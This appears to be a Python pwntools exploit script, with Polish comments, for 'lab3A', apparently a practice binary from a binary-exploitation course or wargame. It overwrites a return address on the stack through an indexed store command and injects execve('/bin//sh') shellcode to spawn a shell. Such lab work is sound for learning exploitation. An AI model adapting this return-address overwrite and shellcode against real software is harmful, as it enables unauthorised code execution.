# -*- coding: utf-8 -*-
from pwn import *

context(arch ='i386', os ='linux')

# Początek bufora: 0xBFFFF3F8
# RA main(): 0xBFFFF5AC ==> Index (0xBFFFF5AC - 0xBFFFF3F8)/ 4 = 109 (index). Niestety jest check na integer overflow i trzeba to robić w ten sposób.
# Bufor: adres do wpisania = numer + (index * 4)
#
# EAX - ptr to 0xB
# EBX - ptr to /bin//sh
# ECX - ptr to /bin//sh,0x0
# EDX - ptr to 0x0
#
# ======= Stack with payload =======
# 0x0 [index 109] [Overwritten RA]
# 0x4 [index 110] /bin
# 0x8 [index 111] //sh
# 0xC [index 112]
# 0x10 [index 113] 0xB

# Script usage: python lab3a.py | ./lab3A

asm_sh = [
    "pop esi",  # 110 0x68732f2f
    "pop ecx",  # 111 reserved for quend!
    "pop ecx",  # 112 0x6e69622f"
    "push esi",
    "push ecx",

    "mov  ebx, esp",

    "mov ecx, edi",
    "mov edx, edi",
    "mov al, 0xB",
    "int  0x80"
]


shellcode = ''
payload = ''

for instr in asm_sh:
    shellcode += asm(instr)

print 'store'
print str(int(0xBFFFF57C)) #[Overwritten RA]
print '109'
print 'store'
print str(int(('/bin')[::-1].encode('hex'), 16))
print '110'
print 'store'
print str(int(('//sh')[::-1].encode('hex'), 16))
# Indeks 111 jest zarezerwowany i nie można z niego skorzystać
print '112'
print 'quit' + shellcode
